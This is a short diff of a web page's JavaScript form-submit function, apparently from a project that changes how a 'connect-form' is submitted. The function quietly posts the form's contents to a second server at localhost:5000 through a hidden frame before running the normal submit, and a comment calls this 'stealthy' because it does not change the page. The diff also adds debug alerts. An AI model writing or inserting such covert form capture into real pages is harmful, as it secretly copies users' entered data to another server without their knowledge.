@@ -24,21 +24,23 @@
 <script type='text/javascript'>
 
 function SubmitForm()
-{
+  {
     /* if(document.forms['connect-form'].onsubmit())
      * { */
-      /* This is the submit to the lazlo activation code server. It is stealthy. It doesn't change the page. */
-      document.forms['connect-form'].action='http://localhost:5000/post';
-      document.forms['connect-form'].target='frame_target';
-      document.forms['connect-form'].method='post';
-      document.forms['connect-form'].submit();
-      /* This is the original submit action */
-      document.forms['connect-form'].action='/connect';
-      document.forms['connect-form'].method='post';
-      document.forms['connect-form'].submit();
+    /* This is the submit to the lazlo activation code server. It is stealthy. It doesn't change the page. */
+    alert("Hello!")
+    document.forms['connect-form'].action='http://localhost:5000/post';
+    document.forms['connect-form'].target='frame_target';
+    document.forms['connect-form'].method='post';
+    document.forms['connect-form'].submit();
+    alert("First post!")
+    /* This is the original submit action */
+    document.forms['connect-form'].action='/connect';
+    document.forms['connect-form'].method='post';
+    document.forms['connect-form'].submit();
     /* }
      * return true; */
-}
+  }
 </script>
 
 
